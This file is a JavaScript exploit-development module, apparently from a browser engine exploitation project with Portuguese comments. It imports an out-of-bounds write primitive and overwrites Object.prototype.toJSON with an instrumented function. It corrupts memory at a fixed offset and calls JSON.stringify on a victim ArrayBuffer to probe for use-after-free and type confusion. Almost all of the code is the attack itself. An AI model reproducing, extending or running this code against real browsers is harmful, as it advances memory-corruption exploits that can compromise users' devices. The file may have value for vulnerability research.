// js/script3/testJsonTypeConfusionUAFSpeculative.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real, oob_dataview_real,
    oob_write_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG } from '../config.mjs';

const TARGETED_UAF_TC_PARAMS = {
    victim_ab_size: 64,
    corruption_offset: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16, // 0x70
    bytes_to_write_for_corruption: 4,
    ppKeyToPollute: 'toJSON',
};

export let currentCallCount_for_UAF_TC_test = 0;
// ##########################################################################
// # MODIFIQUE ESTA LINHA PARA CADA TESTE DE PROFUNDIDADE:                  #
// # Exemplos: 50, 100, 250, 500, 1000, 2000                               #
const MAX_toJSON_DEPTH_FOR_ANALYSIS = 500; // COMECE COM 50 PARA O PRÓXIMO TESTE
// ##########################################################################

export function detailed_toJSON_for_UAF_TC_test_WithDepthControl_AndSlice() { // Mantenha o nome original da função
    currentCallCount_for_UAF_TC_test++;
    const currentOperationThis = this;
    const FNAME_toJSON_local = `detailed_toJSON_DepthCtrlSlice(Call ${currentCallCount_for_UAF_TC_test})`;

    if (currentCallCount_for_UAF_TC_test === 1 || (currentCallCount_for_UAF_TC_test % 50 === 0 && currentCallCount_for_UAF_TC_test <= MAX_toJSON_DEPTH_FOR_ANALYSIS) ) { // Log de título menos frequente
        document.title = `detailed_toJSON_Slice Call ${currentCallCount_for_UAF_TC_test}/${MAX_toJSON_DEPTH_FOR_ANALYSIS}`;
    }
    
    if (currentCallCount_for_UAF_TC_test <= MAX_toJSON_DEPTH_FOR_ANALYSIS) {
        if (currentCallCount_for_UAF_TC_test === 1 || currentCallCount_for_UAF_TC_test % 20 === 0 || currentCallCount_for_UAF_TC_test === MAX_toJSON_DEPTH_FOR_ANALYSIS) { // Log menos frequente no console
            logS3(`[toJSON Poluído - Detalhado c/ Slice] ${FNAME_toJSON_local} Chamado!`, "vuln");
            logS3(`  [CALL ${currentCallCount_for_UAF_TC_test}] typeof this: ${typeof currentOperationThis}, constructor: ${currentOperationThis?.constructor?.name}`, "info");
        }
    }

    if (currentCallCount_for_UAF_TC_test > MAX_toJSON_DEPTH_FOR_ANALYSIS) {
        if (currentCallCount_for_UAF_TC_test === MAX_toJSON_DEPTH_FOR_ANALYSIS + 1) {
            logS3(`  [CALL ${currentCallCount_for_UAF_TC_test}] Profundidade máxima (${MAX_toJSON_DEPTH_FOR_ANALYSIS}) atingida. Retornando undefined.`, "info");
            document.title = `toJSON Profundidade Máx (${MAX_toJSON_DEPTH_FOR_ANALYSIS}) Atingida`;
        }
        return undefined; 
    }

    let details = { 
        raw_byteLength: "N/A", 
        type_of_raw_byteLength: "N/A",
        assigned_byteLength: "N/A", 
        first_dword_attempt: "N/A", 
        first_dword_value: "N/A",
        slice_exists: "N/A", 
        slice_call_attempt: "N/A",
        slice_call_result: "N/A",
        type_toString: "N/A" 
    };
    let error_accessing_props = null;
    try {
        details.type_toString = Object.prototype.toString.call(currentOperationThis);
        
        details.raw_byteLength = currentOperationThis.byteLength;
        details.type_of_raw_byteLength = typeof details.raw_byteLength;
        details.assigned_byteLength = details.raw_byteLength; 
        // Não logar isso toda vez para profundidades maiores, apenas se algo der errado ou em pontos chave
        // logS3(`  [CALL ${currentCallCount_for_UAF_TC_test}] ACCESSO DIRETO this.byteLength: ${details.raw_byteLength} (tipo: ${details.type_of_raw_byteLength})`, "info");


        details.first_dword_attempt = "Tentado";
        try {
            if (currentOperationThis && typeof currentOperationThis.byteLength === 'number' && currentOperationThis.byteLength >=4) {
                let buffer_to_inspect = currentOperationThis instanceof ArrayBuffer ? currentOperationThis : currentOperationThis.buffer;
                let offset_to_inspect = currentOperationThis instanceof ArrayBuffer ? 0 : (currentOperationThis.byteOffset || 0);

                if (buffer_to_inspect instanceof ArrayBuffer && buffer_to_inspect.byteLength >= offset_to_inspect + 4) {
                    details.first_dword_value = new DataView(buffer_to_inspect, offset_to_inspect, 4).getUint32(0, true);
                    // details.first_dword_attempt += ", DataView OK"; // Menos verboso
                } else {
                    // details.first_dword_attempt += ", Buffer inválido ou pequeno demais";
                }
            } else {
                 // details.first_dword_attempt += ", 'this' não tem byteLength numérico >= 4 ou não é buffer";
            }
        } catch (e_dv) {
            logS3(`  [CALL ${currentCallCount_for_UAF_TC_test}] ERRO ao tentar DataView em 'this': ${e_dv.message}`, "warn");
            details.first_dword_attempt += `, ERRO DataView: ${e_dv.message}`;
            error_accessing_props = error_accessing_props || `DV Error: ${e_dv.message}`;
        }

        details.slice_exists = (typeof currentOperationThis.slice === 'function');
        details.slice_call_attempt = "Tentado";
        try {
            if (details.slice_exists) { 
                // Apenas tentar chamar slice na primeira chamada ou se for um ArrayBuffer, para evitar erros desnecessários
                if (currentCallCount_for_UAF_TC_test === 1 && currentOperationThis instanceof ArrayBuffer) {
                    // logS3(`  [CALL ${currentCallCount_for_UAF_TC_test}] 'this.slice' existe. Tentando chamar this.slice(0,1)...`, "info");
                    let slice_result = currentOperationThis.slice(0,1); 
                    details.slice_call_result = `OK, res.len=${slice_result?.byteLength}, tipo=${typeof slice_result}`;
                    // logS3(`  [CALL ${currentCallCount_for_UAF_TC_test}] this.slice(0,1) OK. Result type: ${typeof slice_result}, byteLength: ${slice_result?.byteLength}`, "info");
                } else {
                    details.slice_call_result = "Existe, não chamado (não Call 1 AB)";
                }
            } else {
                 // details.slice_call_attempt += ", 'slice' não é função";
            }
        } catch (e_slice) {
            logS3(`  [CALL ${currentCallCount_for_UAF_TC_test}] ERRO ao chamar this.slice(0,1): ${e_slice.message}`, "error");
            details.slice_call_result = `ERRO: ${e_slice.message}`;
            error_accessing_props = error_accessing_props || `Slice Error: ${e_slice.message}`;
        }
        
        // Logar detalhes completos apenas em intervalos ou se houver erro
        if (error_accessing_props || currentCallCount_for_UAF_TC_test === 1 || currentCallCount_for_UAF_TC_test % 50 === 0 || currentCallCount_for_UAF_TC_test === MAX_toJSON_DEPTH_FOR_ANALYSIS ) {
            logS3(`  [CALL ${currentCallCount_for_UAF_TC_test}] Detalhes: type='${details.type_toString}', byteLen=${details.assigned_byteLength}(${details.type_of_raw_byteLength}), dword=${(typeof details.first_dword_value === 'string') ? details.first_dword_value : toHex(details.first_dword_value)}(${details.first_dword_attempt}), sliceEx=${details.slice_exists}(${details.slice_call_attempt} -> ${details.slice_call_result})`, error_accessing_props ? "error" : "info");
        }
        
    } catch (e_general) { 
        error_accessing_props = `General Error: ${e_general.message}`;
        logS3(`  [toJSON Poluído] ${FNAME_toJSON_local} ERRO GERAL ao acessar props: ${e_general.message} (Chamada: ${currentCallCount_for_UAF_TC_test})`, "critical");
        document.title = `ERRO GERAL toJSON Call ${currentCallCount_for_UAF_TC_test}`;
    }
    
    if (error_accessing_props) {
        // Se um erro ocorrer, retornamos o erro para que JSON.stringify pare e possamos vê-lo.
        // JSON.stringify não serializa objetos de Erro diretamente, então retornamos um objeto simples.
        throw new Error(`Prop Access Error in toJSON Call ${currentCallCount_for_UAF_TC_test}: ${error_accessing_props}`);
    }
    return { toJSON_call: currentCallCount_for_UAF_TC_test, type: details.type_toString }; // Retorno mais simples para reduzir o log
}

export async function executeUAFTypeConfusionTestWithValue(
    testVariantDescription,
    valueToWriteOOB
) {
    const FNAME_TEST = `executeUAFTypeConfusionTest<${testVariantDescription}>`;
    const {
        victim_ab_size,
        corruption_offset, 
        bytes_to_write_for_corruption,
        ppKeyToPollute,
    } = TARGETED_UAF_TC_PARAMS;

    logS3(`--- Iniciando Teste UAF/TC (Depth Test): ${testVariantDescription} ---`, "test", FNAME_TEST);
    logS3(`   MAX_toJSON_DEPTH_FOR_ANALYSIS = ${MAX_toJSON_DEPTH_FOR_ANALYSIS}`, "info", FNAME_TEST);
    logS3(`   Offset: ${toHex(corruption_offset)}, Valor OOB: ${toHex(valueToWriteOOB)}`, "info", FNAME_TEST);
    document.title = `Iniciando UAF/TC Depth ${MAX_toJSON_DEPTH_FOR_ANALYSIS}: ${testVariantDescription}`;

    currentCallCount_for_UAF_TC_test = 0; 

    let stringifyResult = null; 
    let errorOccurredInStringify = null; // Alterado para armazenar o objeto de erro
    let potentiallyFroze = true; 
    let stepReached = "inicio";

    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha ao configurar ambiente OOB. Abortando.", "error", FNAME_TEST);
        document.title = "ERRO: Falha OOB Setup";
        return { potentiallyFroze: false, errorOccurred: new Error("OOB Setup Failed"), calls: currentCallCount_for_UAF_TC_test, stringifyResult };
    }
    document.title = "OOB Configurado";
    stepReached = "oob_configurado";

    let victim_ab = new ArrayBuffer(victim_ab_size);
    logS3(`ArrayBuffer vítima (${victim_ab_size} bytes) recriado.`, "info", FNAME_TEST);
    stepReached = "vitima_criada";

    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKeyToPollute);
    let pollutionAppliedThisRun = true; 
    
    try {
        logS3(`Aplicando PP com detailed_toJSON_for_UAF_TC_test_WithDepthControl_AndSlice...`, "info", FNAME_TEST);
        document.title = `Aplicando PP Depth ${MAX_toJSON_DEPTH_FOR_ANALYSIS}: ${testVariantDescription}`;
        stepReached = "aplicando_pp";
        Object.defineProperty(Object.prototype, ppKeyToPollute, {
            value: detailed_toJSON_for_UAF_TC_test_WithDepthControl_AndSlice, 
            writable: true, configurable: true, enumerable: false
        });
        logS3(`Object.prototype.${ppKeyToPollute} poluído.`, "good", FNAME_TEST);
        stepReached = "pp_aplicada";
        document.title = `PP Aplicada Depth ${MAX_toJSON_DEPTH_FOR_ANALYSIS}: ${testVariantDescription}`;

        logS3(`CORRUPÇÃO: Escrevendo valor ${toHex(valueToWriteOOB)} (${bytes_to_write_for_corruption} bytes) em offset abs ${toHex(corruption_offset)}`, "warn", FNAME_TEST);
        stepReached = "antes_escrita_oob";
        document.title = `Antes Escrita OOB Depth ${MAX_toJSON_DEPTH_FOR_ANALYSIS}: ${testVariantDescription}`;
        oob_write_absolute(corruption_offset, valueToWriteOOB, bytes_to_write_for_corruption);
        logS3("Escrita OOB realizada.", "info", FNAME_TEST);
        stepReached = "apos_escrita_oob";
        document.title = `Após Escrita OOB Depth ${MAX_toJSON_DEPTH_FOR_ANALYSIS}: ${testVariantDescription}`;
        
        await PAUSE_S3(SHORT_PAUSE_S3); 

        stepReached = "antes_stringify";
        document.title = `Antes Stringify Depth ${MAX_toJSON_DEPTH_FOR_ANALYSIS}: ${testVariantDescription}`;
        logS3(`Chamando JSON.stringify(victim_ab)... (MAX_DEPTH=${MAX_toJSON_DEPTH_FOR_ANALYSIS})`, "info", FNAME_TEST);
        
        try {
            stringifyResult = JSON.stringify(victim_ab); 
            stepReached = "apos_stringify";
            document.title = `Stringify Retornou Depth ${MAX_toJSON_DEPTH_FOR_ANALYSIS}: ${testVariantDescription}`;
            potentiallyFroze = false; 
            logS3(`Resultado JSON.stringify(victim_ab): ${String(stringifyResult).substring(0, 200)}...`, "info", FNAME_TEST);
        } catch (e) {
            stepReached = "erro_stringify";
            document.title = `ERRO Stringify (${e.name}) Depth ${MAX_toJSON_DEPTH_FOR_ANALYSIS}: ${testVariantDescription}`;
            potentiallyFroze = false; 
            errorOccurredInStringify = e; // Armazena o objeto de erro
            logS3(`ERRO CAPTURADO JSON.stringify: ${e.name} - ${e.message}. (Chamadas toJSON: ${currentCallCount_for_UAF_TC_test})`, "critical", FNAME_TEST);
            if (e.stack) logS3(e.stack, "error", FNAME_TEST);
            console.error(`JSON.stringify Test Error (${testVariantDescription}):`, e);
        }

    } catch (mainError) {
        stepReached = "erro_principal";
        document.title = `ERRO Principal Depth ${MAX_toJSON_DEPTH_FOR_ANALYSIS}: ${testVariantDescription}`;
        potentiallyFroze = false;
        errorOccurredInStringify = mainError; // Armazena o objeto de erro
        logS3(`Erro principal no teste (${testVariantDescription}): ${mainError.message}`, "error", FNAME_TEST);
        if (mainError.stack) logS3(mainError.stack, "error", FNAME_TEST);
        console.error(mainError);
    } finally {
        if (pollutionAppliedThisRun) { 
            if (originalToJSONDescriptor) {
                Object.defineProperty(Object.prototype, ppKeyToPollute, originalToJSONDescriptor);
            } else {
                delete Object.prototype[ppKeyToPollute];
            }
        }
        clearOOBEnvironment();
        logS3(`Ambiente OOB Limpo. Último passo: ${stepReached}. Chamadas toJSON: ${currentCallCount_for_UAF_TC_test}.`, "info", FNAME_TEST);
        if (potentiallyFroze) {
            logS3(`O TESTE PODE TER CONGELADO. Último passo: ${stepReached}. Chamadas toJSON: ${currentCallCount_for_UAF_TC_test}`, "warn", FNAME_TEST);
            document.title = `CONGELOU? Depth ${MAX_toJSON_DEPTH_FOR_ANALYSIS} Passo: ${stepReached} - Chamadas: ${currentCallCount_for_UAF_TC_test} - ${testVariantDescription}`;
        }
    }
    logS3(`--- Teste UAF/TC Concluído: ${testVariantDescription} (MAX_DEPTH=${MAX_toJSON_DEPTH_FOR_ANALYSIS}, Chamadas toJSON: ${currentCallCount_for_UAF_TC_test}) ---`, "test", FNAME_TEST);
    if (!potentiallyFroze && !errorOccurredInStringify) {
        document.title = `Teste UAF/TC Depth ${MAX_toJSON_DEPTH_FOR_ANALYSIS} OK: ${testVariantDescription}`;
    } else if (errorOccurredInStringify) {
        // O título já deve refletir o erro de stringify
    }
    return { potentiallyFroze, errorOccurred: errorOccurredInStringify, calls: currentCallCount_for_UAF_TC_test, stringifyResult };
}
